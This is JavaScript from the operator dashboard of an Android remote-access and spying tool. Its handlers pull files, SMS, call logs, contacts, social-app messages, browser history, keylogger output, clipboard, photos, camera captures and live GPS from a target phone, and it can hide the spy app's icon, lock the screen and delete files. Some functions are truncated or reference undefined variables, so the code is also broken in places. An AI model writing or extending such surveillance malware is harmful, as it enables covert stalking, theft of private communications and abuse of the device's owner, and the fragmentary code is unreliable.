        // ==================== FILE MANAGER (EXACTLY FROM index (16).html) ====================
        function renderFiles() {
            let html = `
            <div class="file-manager">
                <div class="file-toolbar-sticky">
                    <div class="file-toolbar">
                        <span style="font-weight: 600; color: #1a2634; font-size: 14px; margin-left: 8px;">File Browser</span>

        function generateTreeHtml(path) {
            let html = '';
            const items = fileTreeCache[path];
            if (!items) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Loading...</li>';

            if (items.length === 0) return '<li style="padding-left:24px; color:#7b8a9b; font-size:12px;">Empty folder</li>';

            const folders = items.filter(item => item.isDir).sort((a, b) => a.name.localeCompare(b.name));
            const files = items.filter(item => !item.isDir).sort((a, b) => a.name.localeCompare(b.name));

            folders.forEach(f => {
                const isOpen = expandedFolders.has(f.path);
                const caretCls = isOpen ? 'caret caret-down' : 'caret';
                const nestedCls = isOpen ? 'nested active' : 'nested';

                html += `
                <li>
                    <div class="tree-item folder-item" onclick="handleFolderClick(event, '${f.path}')">
                        <span class="${caretCls}">▶</span>
                        <span class="folder-icon">📁</span>
                        <span class="folder-name">${f.name}</span>
                    </div>
                    <ul class="${nestedCls}">
                        ${isOpen ? generateTreeHtml(f.path) : ''}
                    </ul>
                </li>`;
            });

            files.forEach(f => {
                const pathStr = f.path;
                const isChecked = selectedFiles.includes(pathStr) ? 'checked' : '';
                html += `
                <li>
                    <div class="tree-item file-item">
                        <span style="width:16px;"></span> <!-- spacer for caret -->
                        <input type="checkbox" class="file-checkbox" data-path="${pathStr}" onchange="updateSelected(this)" ${isChecked}>
                        <span class="file-icon">📄</span>
                        <span class="file-name">${f.name}</span>
                        <span class="file-size">${formatBytes(f.size)}</span>
                    </div>
                </li>`;
            });

            return html;
        }

        function handleFolderClick(event, path) {
            event.stopPropagation();
            currentPath = path;

            if (expandedFolders.has(path)) {
                expandedFolders.delete(path);
                renderFiles();
            } else {
                expandedFolders.add(path);
                if (!fileTreeCache[path]) {
                    sendCommand('LIST_FILES', { path: path });
                    renderFiles();
                } else {
                    renderFiles();
                }
            }
        }

        function updateSelected(checkbox) {
            const path = checkbox.dataset.path;
            if (checkbox.checked) {
                if (!selectedFiles.includes(path)) selectedFiles.push(path);
            } else {
                selectedFiles = selectedFiles.filter(p => p !== path);
            }
            updateCounters();
        }

        function downloadSelected() {
            if (selectedFiles.length === 0) {
                alert('No files selected');
                return;
            }
            selectedFiles.forEach(path => {
                sendPlainText('dl ' + path);
            });
        }

        function deleteSelected() {
            if (selectedFiles.length === 0) {
                alert('No files selected');
                return;
            }

            const confirmMsg = `Delete ${selectedFiles.length} file(s)? This action cannot be undone.`;
            if (!confirm(confirmMsg)) return;

            selectedFiles.forEach(path => {
                sendCommand('DELETE_FILE', { path: path });
            });

            selectedFiles = [];
            updateCounters();
        }

        async function loadAppUsageFromFirebase(days) {
            const container = document.getElementById('screenTimeData');
            if (!container) return;
            container.innerHTML = '<p>Loading...</p>';
            try {
                const now = new Date();
                const cutoff = new Date(now.getTime() - days * 86400000);
                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
                    .where('timestamp', '>=', cutoff)
                    .orderBy('timestamp', 'desc')
                    .get();
                if (snapshot.empty) {
                    container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
                    return;
                }
                const appTotals = new Map();
                snapshot.forEach(doc => {
                    const data = doc.data();
                    const apps = JSON.parse(data.apps);
                    if (Array.isArray(apps)) {
                        apps.forEach(app => {
                            const name = app.appName || app.packageName || 'Unknown';
                            const timeMs = app.totalTimeMs || 0;
                            if (appTotals.has(name)) {
                                appTotals.set(name, appTotals.get(name) + timeMs);
                            } else {
                                appTotals.set(name, timeMs);
                            }
                        });
                    }
                });
                if (appTotals.size === 0) {
                    container.innerHTML = '<p>No usage data for the selected period.</p>';
                    return;
                }
                const sorted = Array.from(appTotals.entries()).sort((a, b) => b[1] - a[1]);
                const max = sorted[0][1];
                let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
                for (let [name, timeMs] of sorted) {
                    const pct = max ? Math.round((timeMs / max) * 100) : 0;
                    const color = getColorForDuration(timeMs);
                    html += `
                <div class="app-usage-item">
                    <div class="app-usage-name">${escapeHtml(name)}</div>
                    <div class="usage-bar-container">
                        <div class="usage-bar" style="width:${pct}%; background-color:${color};"></div>
                    </div>
                    <div class="app-usage-time">${formatDuration(timeMs)}</div>
                </div>
            `;
                }
                html += '</div>';
                container.innerHTML = html;
            } catch (err) {
                console.error(err);
                container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>';
            }
        }

        // ==================== ENHANCED MAP ====================
        function renderLiveMap(lat, lon, acc) {
            if (!liveMap) {
                panel.innerHTML = `
            <div style="position:relative;">
                <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
                <div class="map-info" id="liveMapInfo">

                <label class="follow-checkbox" id="followCheckbox">
                    <input type="checkbox" id="followLocationCheck"> Follow location
                </label>
            </div>
        `;
                const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; OpenStreetMap contributors'
                });
                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                    attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
                });
                liveMap = L.map('liveMapContainer').setView([lat, lon], 18);
                streetLayer.addTo(liveMap);
                liveMap.currentTileLayer = streetLayer;
                liveMap.satelliteLayer = satelliteLayer;
                liveMap.streetLayer = streetLayer;
                liveMarker = L.marker([lat, lon], { icon: L.divIcon({ className: 'current-location-marker', iconSize: [12, 12] }) }).addTo(liveMap).bindPopup('Device Location');
                liveCircle = L.circle([lat, lon], { radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2 }).addTo(liveMap);
                document.getElementById('liveMapTypeToggle').addEventListener('click', () => {
                    if (currentMapType === 'street') {
                        liveMap.removeLayer(liveMap.currentTileLayer);
                        liveMap.satelliteLayer.addTo(liveMap);
                        liveMap.currentTileLayer = liveMap.satelliteLayer;
                        currentMapType = 'satellite';
                        document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Street';
                    } else {
                        liveMap.removeLayer(liveMap.currentTileLayer);
                        liveMap.streetLayer.addTo(liveMap);

                        document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
                    }

                    followLocation = e.target.checked;
                });
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
                })
                    .then(response => response.json())
                    .then(data => {
                        const address = data.display_name || 'Address not found';
                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
                    })
                    .catch(err => {
                        console.error('Geocoding error:', err);
                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
                    });
            } else {
                liveMarker.setLatLng([lat, lon]);
                liveCircle.setLatLng([lat, lon]);
                liveCircle.setRadius(acc);
                document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
                })
                    .then(response => response.json())
                    .then(data => {
                        const address = data.display_name || 'Address not found';
                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
                    })
                    .catch(err => {
                        console.error('Geocoding error:', err);
                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
                    });
                if (followLocation) {
                    liveMap.setView([lat, lon]);
                }
            }
        }

        function renderTable(rows, headers) {

            const pageRows = rows.slice(start, start + pageSize);
            let html = '<div style="overflow-x:auto;"><table class="premium-table"><thead><tr>';
            headers.forEach((h, i) => {
                const indicator = (currentSortCol === i) ? (currentSortDir === 'asc' ? '▲' : '▼') : '↕';
                html += `<th onclick="sortTable(${i})">${h}<span class="sort-indicator">${indicator}</span></th>`;
            });
            html += '</tr></thead><tbody>';
            pageRows.forEach(r => {
                let rowBg = '';
                if (dataType === 'call' || dataType === 'sms') {
                    const t = (r[0] || '').toLowerCase();
                    if (t.includes('incoming')) rowBg = 'style="background-color: #e8f5e9 !important;"';
                    else if (t.includes('outgoing')) rowBg = 'style="background-color: #ffebee !important;"';
                }
                html += `<tr ${rowBg}>`;
                r.forEach(cell => html += `<td>${escapeHtml((cell ?? '').toString())}</td>`);
                html += '</tr>';
            });
            html += '</tbody></table></div>';
            if (totalPages > 1) {
                html += '<div class="pagination">';
                for (let i = 0; i < totalPages; i++) {
                    const activeClass = i === currentPage ? 'style="background:var(--primary);color:white;"' : '';
                    html += `<button class="page-btn" ${activeClass} onclick="gotoPage(${i})">${i + 1}</button>`;
                }
                html += '</div>';
            }
            panel.innerHTML = html;
        }

        window.sortTable = function(index) {
            if (currentSortCol === index) {
                currentSortDir = currentSortDir === 'asc' ? 'desc' : 'asc';
            } else {
                currentSortCol = index;
                currentSortDir = 'asc';
            }
            
            currentData.sort((a, b) => {
                let v1 = (a[index] || '').toString();
                let v2 = (b[index] || '').toString();
                
                // 1. Try Date comparison first (most common for logs)
                const d1 = Date.parse(v1);
                const d2 = Date.parse(v2);
                if (!isNaN(d1) && !isNaN(d2) && (v1.includes('/') || v1.includes('-') || v1.includes(':'))) {
                    return currentSortDir === 'asc' ? d1 - d2 : d2 - d1;
                }

                // 2. Try numeric comparison (strip currency/units if needed)
                const n1 = parseFloat(v1.replace(/[^0-9.-]/g,""));
                const n2 = parseFloat(v2.replace(/[^0-9.-]/g,""));
                if (!isNaN(n1) && !isNaN(n2) && !v1.includes('/') && !v1.includes(':')) {
                    return currentSortDir === 'asc' ? n1 - n2 : n2 - n1;
                }
                
                // 3. Fallback to string comparison
                v1 = v1.toLowerCase();
                v2 = v2.toLowerCase();
                if (v1 < v2) return currentSortDir === 'asc' ? -1 : 1;
                if (v1 > v2) return currentSortDir === 'asc' ? 1 : -1;
                return 0;
            });
            
            currentPage = 0;
            renderTable(currentData, getHeadersForType(dataType));
        };

        function getHeadersForType(type) {
            const map = {
                'sms': ['Type', 'Number', 'Message', 'Date'],
                'call': ['Type', 'Number', 'Name', 'Date', 'Duration'],
                'contacts': ['Name', 'Number', 'Times Contacted'],
                'wifi': ['SSID', 'Signal', 'Status'],
                'social': ['App', 'From/Title', 'Message', 'Date']
            };
            return map[type] || [];
        }

        window.gotoPage = function (p) {
            currentPage = p;
            if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
            else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
            else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
            else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
            else if (dataType === 'social') renderTable(currentData, ['App', 'From/Title', 'Message', 'Date']);
        };

        function displaySMS(data) {
            let smsArray = [];
            try {
                if (!data) smsArray = [];
                else if (typeof data === 'object' && data.error) {
                    panel.innerHTML = `<h3>💬 SMS Messages</h3><div style="padding:24px; color:var(--danger); background:var(--danger-bg); border-radius:12px; border:1px solid #fbd5d5;">⚠️ Device Error: ${escapeHtml(data.error)}</div>`;
                    return;
                }
                else if (Array.isArray(data)) smsArray = data;
                else if (typeof data === 'string') {
                    const parsed = JSON.parse(data);
                    smsArray = Array.isArray(parsed) ? parsed : (parsed.data || []);
                }
                else if (typeof data === 'object') {
                    // Smart discovery: check common keys for arrays
                    const keys = ['messages', 'sms', 'list', 'data', 'sms_list'];
                    for (const k of keys) {
                        if (data[k] && Array.isArray(data[k])) {
                            smsArray = data[k];
                            break;
                        }
                    }
                    if (smsArray.length === 0) {
                        for (let k in data) { if (Array.isArray(data[k])) { smsArray = data[k]; break; } }
                    }
                }
            } catch (e) { console.error('SMS parse error:', e); }

            if (!Array.isArray(smsArray) || smsArray.length === 0) {
                panel.innerHTML = '<h3>💬 SMS Messages</h3><p style="padding:20px; text-align:center; opacity:0.7;">No messages found in this box.</p>';
                return;
            }
            
            // Robust sort: handling both number and string dates
            smsArray.sort((a, b) => {
                const da = Date.parse(a.date || a.timestamp || a.timeFmt || 0) || (a.date || 0);
                const db = Date.parse(b.date || b.timestamp || b.timeFmt || 0) || (b.date || 0);
                return db - da;
            });

            const rows = smsArray.map(m => {
                const typeStr = String(m.type || '').toLowerCase();
                // Match "Incoming" string from Java or standard inbox indicators
                const isIncoming = typeStr.includes('incoming') || typeStr.includes('inbox') || typeStr === '1' || m.type == 1 || typeStr === 'in';
                
                return [
                    isIncoming ? '📥 Incoming' : '📤 Outgoing',
                    m.address || m.number || m.phone || 'Unknown',
                    m.body || m.text || m.message || m.content || '',
                    formatAnyDate(m.date || m.timestamp || m.timeFmt)
                ];
            });
            currentSortCol = 3; 
            currentSortDir = 'desc';
            currentData = rows;
            dataType = 'sms';
            renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
        }

        async function fetchHistoryFromCloud() {
            if (!currentUser || !selectedDeviceId) return;
            const days = parseInt(document.getElementById('histDays').value);
            const cutoff = Date.now() - (days * 86400000);
            const listDiv = panel.querySelector('#historyMainList');
            listDiv.innerHTML = '<p style="padding:20px; text-align:center;">🔍 Scanning cloud data...</p>';

            try {
                const snapshot = await db.collection('devices').doc(selectedDeviceId)
                    .collection('location_history')
                    .where('timestamp', '>', cutoff)
                    .orderBy('timestamp', 'desc')
                    .limit(500)
                    .get();
                
                const history = snapshot.docs.map(doc => {
                    const d = doc.data();
                    const date = new Date(d.timestamp);
                    d.timeFmt = date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                    return d;
                });

                displayLocationHistory(history, true);
            } catch (e) { 
                console.error('Cloud Fetch Error:', e); 
                if (listDiv) listDiv.innerHTML = `<p style="padding:20px; color:var(--danger);">Error: ${e.message}</p>`;
            }
        }

        function displayLocationHistory(data, fromCloud = false) { 
            const history = typeof data === 'string' ? JSON.parse(data) : data;
            const listDiv = panel.querySelector('#historyMainList');

            if (!Array.isArray(history) || history.length === 0) {
                if (listDiv) listDiv.innerHTML = '<p style="padding:20px; text-align:center;">No history found for this period.</p>';

            // Ensure map and layers are initialized

            }
            
            // Clear map layers

            const points = [];
            let html = '';
            
            history.forEach((loc) => {

                const lon = loc.lon || loc.longitude;

            });
            
            if (listDiv) listDiv.innerHTML = html;
            
            if (points.length > 0 && window._historyMap) {
                const polyline = L.polyline(points, { color: '#0f62fe', weight: 4, opacity: 0.3, dashArray: '5, 10' });

        function handleJSON(json) {
            if (Array.isArray(json)) {
                if (pendingCommand === 'LIST_FILES') {
                    currentData = json;
                    fileTreeCache[currentPath] = json;
                    expandedFolders.add(currentPath);
                    renderFiles();
                }
                else if (pendingCommand === 'GET_SMS') { displaySMS(json); }
                else if (pendingCommand === 'GET_CALL_LOGS') { displayCallLogs(json); }
                else if (pendingCommand === 'GET_CONTACTS') { displayContacts(json); }
                else if (pendingCommand === 'GET_WIFI_NETWORKS') { displayWifiNetworks(json); }
                pendingCommand = null; return;
            }
            switch (json.type) {
                case 'FILE_LIST':
                    try {
                        const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                        const _files = Array.isArray(_fl) ? _fl : [];
                        fileTreeCache[currentPath] = _files;
                        expandedFolders.add(currentPath);
                        renderFiles();
                    } catch (e) { console.error('FILE_LIST error:', e); }
                    break;
                case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
                case 'LOCATION_UPDATE':
                    try {
                        const loc = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
                        const lat = loc.lat || loc.latitude;
                        const lon = loc.lon || loc.longitude;
                        const acc = loc.accuracy || 10;
                        currentLocation = { lat, lon, acc };

                        if (liveGpsActive) {
                            renderLiveMap(lat, lon, acc);
                        } else {
                            renderMap(loc);
                        }

                        // Also update geofence blue dot if panel is open
                        if (window._geofenceMap) {
                            updateGeofenceDeviceMarker(lat, lon, acc);
                        }
                    } catch (e) { console.error('Error parsing location update:', e); }
                    break;
                case 'PONG':
                    clearTimeout(window._pingTimeout);
                    const pBtn = document.getElementById('pingBtn');
                    if (pBtn) {
                        pBtn.innerHTML = '✅ PONG';
                        setTimeout(() => { pBtn.innerHTML = '⚡ Ping'; pBtn.disabled = false; }, 2000);
                    }
                    showNotification('⚡ Instant Status: DEVICE ONLINE');
                    break;
                case 'DEVICE_INFO': try { 
                    const info = typeof json.data === 'string' ? JSON.parse(json.data) : (json.data || json);
                    updateDashboardStats(info); 
                    showNotification('✅ Device info updated');
                } catch (e) { } break;
                case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
                case 'FILE_CHUNK':
                    const tr = fileTransfers[json.transferId];
                    if (!tr) return;
                    setTimeout(() => {
                        try {
                            const bin = atob(json.data), bytes = new Uint8Array(bin.length);
                            for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
                            tr.chunks[json.chunkIndex] = bytes;
                            tr.received++;
                            const pct = Math.round((tr.received / tr.totalChunks) * 100);
                            document.getElementById('progressPercent').innerText = pct + '%';
                            document.getElementById('progressBar').style.width = pct + '%';
                            if (tr.received === tr.totalChunks) {
                                const blob = new Blob(tr.chunks), url = URL.createObjectURL(blob), a = document.createElement('a');
                                a.href = url;
                                a.download = tr.fileName;
                                a.click();
                                URL.revokeObjectURL(url);
                                delete fileTransfers[json.transferId];
                                document.getElementById('downloadProgress').style.display = 'none';
                                showNotification(`✅ Downloaded: ${tr.fileName}`);
                            }
                        } catch (e) {
                            showNotification('Chunk decode error');
                            delete fileTransfers[json.transferId];
                            document.getElementById('downloadProgress').style.display = 'none';
                        }
                    }, 0);
                    break;
                case 'FLASH_ON': flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('🔦 Flashlight ON'); break;
                case 'FLASH_OFF': flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('🔦 Flashlight OFF'); break;
                case 'APP_HIDDEN': iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; showNotification('App icon hidden'); break;
                case 'APP_SHOWN': iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; showNotification('App icon shown'); break;
                case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'APP_USAGE_DATA': try { displayAppUsage(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'RECENT_IMAGES_DATA': try { displayPhotoGallery(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
                case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
                case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
                case 'GEOFENCE_ALERT': 
                    pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone');
                    if (json.event === 'EXIT') {
                        showGeofencePopupAlert(currentLocation?.lat, currentLocation?.lon);
                    }
                    break;
                case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
                case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
                case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
                case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
                case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES', { path: currentPath }); break;
                case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
                case 'GPS_UPDATES_STOPPED': 
                    liveGpsActive = false; 
                    const gpsBtn = document.getElementById('liveGpsBtn'); 
                    if (gpsBtn) { 
                        gpsBtn.innerHTML = '<span>🛰️</span> Live GPS Track'; 
                        gpsBtn.style.cssText = ''; 
                    } 
                    showNotification('GPS tracking stopped'); 
                    break;
                case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
                case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
                case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
                default: console.log('Unhandled type:', json.type);
            }
            pendingCommand = null;
        }
